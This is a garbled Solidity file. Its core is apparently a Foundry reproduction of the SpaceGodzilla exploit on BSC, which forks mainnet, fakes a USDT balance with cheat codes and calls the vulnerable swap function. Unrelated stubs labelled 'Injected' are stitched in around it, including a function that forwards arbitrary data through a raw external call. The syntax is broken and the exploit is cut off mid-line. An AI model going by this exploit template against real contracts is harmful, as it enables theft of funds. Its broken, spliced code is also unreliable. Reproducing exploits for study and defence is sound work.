
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

Note:;
1. `attackers` is not the same as `address(this)`, they are both the `Test` contract address.;
2. The vulnerability is not on the contract itself, but on the `swapAndLiquifyStepv1` function.;

;
;
interface ISpaceGodzilla {
    function swapAndLiquifyStepv1() external;
    function swapTokensForOther(uint256 tokenAmount) external};
contract AttackContract is Test {
    using stdStorage for StdStorage;
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address CakeLP = 0x8AfF4e8d24F445Df313928839eC96c4A618a91C8;
    address SpaceGodzilla = 0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0;
    constructor() {
        cheat.createSelectFork("bsc", 19523980);
        cheat.label(address(this), "AttackContract");
        cheat.label(USDT, "USDT");
        cheat.label(CakeLP, "CakeLP");
        cheat.label(SpaceGodzilla, "SpaceGodzilla");
        emit log_string("This reproduce shows how attacker exploit SpaceGodzilla, cause 25,378 BUSD lost");
        emit log_string("[Note] We skipped the part where the attacker made a flash loan with 16 pools to get the initial capital");
        stdstore.target(USDT);
                .sig(IERC20(USDT).balanceOf.selector);
                .with_key(address(this));
                .checked_write(2952797730003166405412733);
        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
        assert(usdt_balance == 2952797730003166405412733)};
    function testExploit() public {
        uint256 init_capital = IERC20(USDT).balanceOf(address(this));
        emit log_named_decimal_uint("[info] Attacker USDT Balance", init_capital, 18);
        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69127461036369179405415017714);
        (uint r0, uint r1,) = Uni_Pair_V2(CakeLP).getReserves();
        assert(r0 == 76041697635825849047705725848735);
        assert(r1 == 90478604689102338898952);
        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
        uint256 trans_us
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}